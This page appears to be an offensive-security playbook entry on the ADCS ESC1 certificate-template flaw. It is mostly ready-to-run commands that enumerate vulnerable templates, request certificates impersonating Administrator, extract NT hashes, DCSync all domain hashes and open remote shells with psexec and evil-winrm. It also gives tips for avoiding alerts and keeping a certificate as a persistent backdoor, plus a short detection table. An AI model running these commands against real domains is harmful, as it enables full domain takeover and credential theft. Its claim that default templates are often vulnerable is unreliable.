---
title: "Attack #27 — ESC1 SAN Specification in Template"
description: "ESC1 is the most impactful and commonly exploited ADCS vulnerability — a misconfigured certificate template that allows any low-privileged domain user to…"
category: active-directory
tags: ["active-directory", "kerberos", "adcs", "privilege-escalation"]
tools: ["NetExec", "Impacket", "Rubeus", "Certipy", "Evil-WinRM"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-Four/🟢 Attack #27 — ESC1 SAN Specification in Template.md"
---
# 🟢 Attack #27 — ESC1: SAN Specification in Certificate Template

***

## 📖 How It Works

ESC1 is **the most impactful and commonly exploited ADCS vulnerability** — a misconfigured certificate template that allows any low-privileged domain user to request a certificate that impersonates any other user in the domain, including Domain Admins. The attacker specifies an arbitrary **Subject Alternative Name (SAN)** in the certificate request, and the Certificate Authority (CA) blindly issues a certificate for that identity. The attacker then uses the issued certificate to authenticate as the target user via PKINIT (Kerberos certificate-based authentication), effectively achieving **instant domain compromise from a standard domain user account**.

### The Four Conditions That Create ESC1

All four conditions must be true simultaneously for a template to be vulnerable:

| # | Condition | Template Setting | Why It's Dangerous |
|---|---|---|---|
| 1 | **Enrollee Supplies Subject** | `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` enabled ("Supply in the request") | The requester — not Active Directory — defines the identity in the certificate |
| 2 | **Authentication EKU** | `Client Authentication`, `Smart Card Logon`, `PKINIT Client Authentication`, or `Any Purpose` | The certificate can be used to authenticate to the domain |
| 3 | **Permissive Enrollment** | `Domain Users`, `Authenticated Users`, or similar group has Enroll/AutoEnroll rights | Any domain user can request certificates from this template |
| 4 | **No Manager Approval** | Manager Approval is NOT required | Requests are processed immediately without human review |

### How the Attack Works Step-by-Step

```
1. Enumerate ADCS environment — find CAs and vulnerable templates
2. Identify a template with all 4 ESC1 conditions met
3. Request a certificate from the vulnerable template
4. In the request, specify the SAN as the target user's UPN (e.g., Administrator@corp.local)
5. The CA issues a certificate with the target's identity embedded
6. Use the certificate to authenticate via PKINIT (Kerberos)
7. Receive a TGT as the target user — you ARE the Domain Admin now
8. Extract the NT hash via U2U (UnPAC-the-Hash) for pass-the-hash
```

### Why This Works

Active Directory Certificate Services was designed to allow flexibility in certificate issuance — the "Supply in the request" option was intended for scenarios where the certificate subject doesn't match the requesting user (web servers, code signing, etc.). But when this is combined with an authentication EKU, the CA creates a certificate that proves the holder IS the person named in the SAN — and the Domain Controller accepts this as valid PKINIT authentication. The CA never verifies that the requester is authorized to impersonate the SAN identity.

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **Domain user account** | Any standard domain user — "Domain Users" or "Authenticated Users" must have Enroll rights on the template |
| **Network access to CA** | Must reach the CA's enrollment endpoint (RPC, HTTP, or DCOM) |
| **ADCS deployed in domain** | At least one Enterprise CA must exist |
| **Vulnerable template exists** | Template must have all 4 ESC1 conditions simultaneously |

***

## 🛠️ Tools

| Tool | Platform | Notes |
|---|---|---|
| **Certipy** | Linux | All-in-one ADCS exploitation — `find`, `req`, `auth` subcommands |
| **Certify** | Windows | SharpCollection tool — enumerate and request vulnerable certificates |
| **Rubeus** | Windows | PKINIT authentication with obtained certificate |
| **ForgeCert** | Windows | Forge certificates directly (for Golden Certificate attacks) |
| **Impacket — getTGT.py** | Linux | PKINIT authentication with `.pfx` or `.ccache` |
| **openssl** | Linux/Windows | Convert between certificate formats (.pfx, .pem, .p12) |

***

## 💻 Full Commands

### 🔵 Step 1 — Enumerate Vulnerable Certificate Templates

#### Certipy (Linux — Recommended)

```bash
# ── Find all vulnerable templates across the ADCS environment ─────────────────
certipy find -u low_user@corp.local -p 'Password1' -dc-ip 10.10.10.10

# Output: Generates text and JSON files with all CA and template info
# Look for: [!] Vulnerabilities: ESC1

# ── Verbose output — show detailed template configuration ─────────────────────
certipy find -u low_user@corp.local -p 'Password1' -dc-ip 10.10.10.10 -stdout

# ── Filter for vulnerable templates only ──────────────────────────────────────
certipy find -u low_user@corp.local -p 'Password1' -dc-ip 10.10.10.10 \
  -vulnerable -stdout

# Key fields to look for in ESC1-vulnerable templates:
# Template Name:             VulnerableTemplate
# Enrollee Supplies Subject: True              ← CRITICAL — this is the ESC1 flag
# Client Authentication:     True              ← Authentication EKU present
# Enrollment Rights:         CORP.LOCAL\Domain Users  ← Low-priv can enroll
# Requires Manager Approval: False             ← No human review
```

#### Certify (Windows)

```powershell
# ── Find vulnerable templates ─────────────────────────────────────────────────
.\Certify.exe find /vulnerable

# ── Find templates with specific ESC1 conditions ─────────────────────────────
.\Certify.exe find /enrolleeSuppliesSubject

# ── Show detailed template info ───────────────────────────────────────────────
.\Certify.exe find /vulnerable /currentuser

# Key output to look for:
# [!] Vulnerable Certificates Templates :
#     Template           : VulnerableTemplate
#     Enrollee Supplies Subject : True
#     Client Authentication : True
#     Enrollment Rights      : CORP\Domain Users
#     Requires Manager Approval : False
```

#### Manual Enumeration (PowerShell)

```powershell
# ── Query all certificate templates via LDAP ──────────────────────────────────
Get-ADObject -LDAPFilter '(objectclass=pKICertificateTemplate)' \
  -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,$((Get-ADRootDSE).configurationNamingContext)" \
  -Properties * | Where-Object { 
    $_.msPKI-Certificate-Name-Flag -band 1  # CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT
  } | Select-Object Name, msPKI-Certificate-Name-Flag, pKIExtendedKeyUsage

# ── Check enrollment rights ───────────────────────────────────────────────────
$template = Get-ADObject -LDAPFilter '(&(objectclass=pKICertificateTemplate)(cn=VulnerableTemplate))' \
  -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,$((Get-ADRootDSE).configurationNamingContext)"
(Get-Acl "AD:$($template.DistinguishedName)").Access | 
  Where-Object { $_.ActiveDirectoryRights -match "ExtendedRight" -and $_.ObjectType -eq "0e10c968-78fb-11d2-90d4-00c04f79dc55" }
# ObjectType 0e10c968... = Certificate-Enrollment extended right
```

***

### 🔴 Step 2 — Request Certificate with Forged SAN

#### Certipy (Linux — Most Common Method)

```bash
# ── Request certificate impersonating Administrator ───────────────────────────
certipy req -u low_user@corp.local -p 'Password1' -dc-ip 10.10.10.10 \
  -ca CORP-CA \
  -template VulnerableTemplate \
  -upn Administrator@corp.local

# Flags explained:
# -ca        = Name of the Certificate Authority (from 'certipy find' output)
# -template  = Vulnerable template name
# -upn       = UPN of the target user to impersonate (Subject Alternative Name)

# Output: Saved certificate and private key to 'administrator.pfx'

# ── Request impersonating a specific DA ───────────────────────────────────────
certipy req -u low_user@corp.local -p 'Password1' -dc-ip 10.10.10.10 \
  -ca CORP-CA \
  -template VulnerableTemplate \
  -upn domain_admin@corp.local

# ── Request using NT hash (Pass-the-Hash authentication to CA) ────────────────
certipy req -u low_user@corp.local -hashes :a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6 \
  -dc-ip 10.10.10.10 \
  -ca CORP-CA \
  -template VulnerableTemplate \
  -upn Administrator@corp.local

# ── Request using Kerberos authentication ─────────────────────────────────────
export KRB5CCNAME=low_user.ccache
certipy req -u low_user@corp.local -k -no-pass -dc-ip 10.10.10.10 \
  -ca CORP-CA \
  -template VulnerableTemplate \
  -upn Administrator@corp.local
```

#### Certify (Windows)

```powershell
# ── Request certificate with alternate SAN ────────────────────────────────────
.\Certify.exe request /ca:DC01.corp.local\CORP-CA \
  /template:VulnerableTemplate \
  /altname:Administrator

# Output: Certificate in PEM format
# Copy the entire -----BEGIN RSA PRIVATE KEY----- ... -----END CERTIFICATE-----
# block to a file called cert.pem

# ── Convert PEM to PFX for use with Rubeus ───────────────────────────────────
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" \
  -export -out administrator.pfx
# Enter export password when prompted (can be blank)
```

***

### 🔴 Step 3 — Authenticate with the Certificate

#### Certipy (Linux — PKINIT Authentication)

```bash
# ── Authenticate using the certificate — get TGT + NT hash ───────────────────
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10

# Output:
# [*] Using principal: administrator@corp.local
# [*] Trying to get TGT...
# [*] Got TGT
# [*] Saved credential cache to 'administrator.ccache'
# [*] Trying to retrieve NT hash for 'administrator'
# [*] Got hash for 'administrator@corp.local': aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe

# ── Set the ticket and use it ─────────────────────────────────────────────────
export KRB5CCNAME=administrator.ccache

# DCSync — dump all domain hashes
secretsdump.py -k -no-pass corp.local/Administrator@DC01.corp.local

# Remote shell
psexec.py -k -no-pass corp.local/Administrator@DC01.corp.local
wmiexec.py -k -no-pass corp.local/Administrator@DC01.corp.local
evil-winrm -i DC01.corp.local -r corp.local

# ── Or use the extracted NT hash for Pass-the-Hash ────────────────────────────
nxc smb DC01.corp.local -u Administrator \
  -H 2b576acbe6bcfda7294d6bd18041b8fe -x "whoami"

secretsdump.py corp.local/Administrator@DC01.corp.local \
  -hashes :2b576acbe6bcfda7294d6bd18041b8fe
```

#### Rubeus (Windows — PKINIT Authentication)

```powershell
# ── Authenticate with the PFX certificate ─────────────────────────────────────
.\Rubeus.exe asktgt /user:Administrator /certificate:administrator.pfx \
  /password:<pfx_password> /ptt /nowrap

# If no password on PFX:
.\Rubeus.exe asktgt /user:Administrator /certificate:administrator.pfx /ptt /nowrap

# ── Extract NT hash via U2U (UnPAC-the-Hash) ─────────────────────────────────
.\Rubeus.exe asktgt /user:Administrator /certificate:administrator.pfx \
  /password:<pfx_password> /getcredentials /nowrap

# Output includes:
# [*] Getting credentials using U2U
# ServiceName           :  krbtgt/CORP.LOCAL
# CredentialInfo        :
#   NTLM              : 2b576acbe6bcfda7294d6bd18041b8fe  ← DA NT hash

# ── Verify ────────────────────────────────────────────────────────────────────
klist
dir \\DC01.corp.local\C$
```

***

### 🔴 Full Attack Chain — ESC1 One-Liner (Linux)

```bash
# ── Complete ESC1 exploitation in 3 commands ──────────────────────────────────

# 1. Find vulnerable templates
certipy find -u low_user@corp.local -p 'Password1' -dc-ip 10.10.10.10 -vulnerable -stdout

# 2. Request certificate as Administrator
certipy req -u low_user@corp.local -p 'Password1' -dc-ip 10.10.10.10 \
  -ca CORP-CA -template VulnerableTemplate -upn Administrator@corp.local

# 3. Authenticate and get TGT + NT hash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10

# 4. Own the domain
export KRB5CCNAME=administrator.ccache
secretsdump.py -k -no-pass corp.local/Administrator@DC01.corp.local -just-dc-ntlm
```

***

## 🎯 OPSEC Tips

- **ESC1 is loud** — the certificate request is logged on the CA server; Event ID 4887 records every certificate issuance including the SAN
- **Certificate-based persistence is powerful** — the issued certificate is valid for the template's validity period (often 1-2 years); even if the target user's password changes, the certificate remains valid
- **Don't request certificates for obvious accounts** — requesting a cert for "Administrator" may trigger alerts; consider targeting less-monitored DA accounts
- **Clean up certificates** — issued certificates can be revoked by the CA administrator; keep your PFX file safe, it's your persistent backdoor
- **Check for enrollment restrictions** — some templates have additional enrollment restrictions like authorized signatures or issuance policies that may block your request
- **The CA name matters** — you need the exact CA name (e.g., `CORP-CA`, not `CORP-CA-01`); get this from `certipy find` output

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **4886** | Security Log (CA) | Certificate Services received a certificate request |
| **4887** | Security Log (CA) | Certificate Services approved a certificate request and issued a certificate — **check the SAN field** |
| **4768** | Security Log (DC) | TGT requested using certificate (PKINIT) — Pre-Authentication Type = 16 (certificate) |
| **4769** | Security Log (DC) | TGS requested using PKINIT-obtained TGT |
| **4624** | Security Log (DC) | Logon with certificate-based authentication |

**Primary detection signature:** Monitor CA event logs for **Event ID 4887** where the **Subject Alternative Name does not match the requesting user**. If `low_user` requests a certificate where the SAN contains `Administrator@corp.local`, that is a definitive ESC1 exploitation indicator. Additionally, alert on PKINIT authentication from accounts that don't normally use smart card or certificate-based logon (Event 4768 with Pre-Auth Type 16).

***

## 🔗 Attack Chain Context

```
[ESC1] ──→ Instant Domain Admin from Domain User
         │
         ├──→ 🔑 Certificate = persistent auth token (valid for months/years)
         ├──→ 🩸 Extract NT hash via UnPAC-the-Hash → Pass-the-Hash everywhere
         ├──→ 📋 DCSync with obtained DA access → dump all domain hashes
         ├──→ 🎫 Golden Ticket forging with extracted KRBTGT hash (Attack #11)
         ├──→ 🔄 Certificate survives password changes — only revocation kills it
         ├──→ 🔗 Chain with: ESC4 (#30) — if you have write permissions on templates
         └──→ 💀 Defeated by: remove ENROLLEE_SUPPLIES_SUBJECT flag, require manager approval
```

**ESC1 is the single most impactful ADCS vulnerability.** In real-world pentests, it is found in approximately 50-75% of environments with ADCS deployed, because the default "User" and "Web Server" templates often have the vulnerable configuration. A single ESC1-vulnerable template turns every domain user into a potential Domain Admin.

***

> ✅ **Attack #27 — ESC1 complete.**
